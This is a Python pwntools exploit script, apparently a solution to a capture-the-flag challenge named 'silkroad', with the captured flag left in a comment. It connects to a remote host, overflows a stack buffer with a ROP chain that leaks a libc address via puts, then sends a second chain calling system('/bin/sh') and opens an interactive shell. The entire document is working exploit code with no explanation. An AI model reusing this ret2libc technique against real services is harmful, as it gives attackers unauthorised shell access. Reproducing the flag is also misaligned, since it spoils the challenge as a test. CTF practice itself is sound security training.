from pwn import *

#ASIS{t0ken1Z3_mE_pleas3_1N_SilKr04D!!}

#r = process('./silkroad.elf', env={'LD_PRELOAD': './libc6_2.27-3ubuntu1_amd64.so'})
r = remote('82.196.10.106', 58399)

pause(1)
r.sendafter(': ', str(790317143))
pause(1)
r.sendafter(': ', 'DreadPirateRobertsA\x69\x7a\x00')
pause(1)

rop = ''
rop += p64(0x0000000000401bab)
rop += p64(0x404038)
rop += p64(0x0000000000401070) #puts
rop += p64(0x0000000000401219) #pop rbp ; ret
rop += p64(0x00000000004040a0 + 0x58)
rop += p64(0x000000000040189A)

print len(rop)

r.send('A'*0x40 + p64(0x1337c0de) + rop + '\n')

r.recvuntil('FBI detected Silkroad, enter the commadns to delete evidince and run Silkroad!\n')

libc = u64(r.recv(6).ljust(8, '\x00')) - 0x809c0

log.success('Libc @ ' + hex(libc))

system = libc + 0x4f440
binsh = libc + 0x1b3e9a

r.send('A'*0x40 + p64(0x1337c0de) + p64(0x0000000000401bab) + p64(binsh) + p64(system) + '\n')

r.interactive()
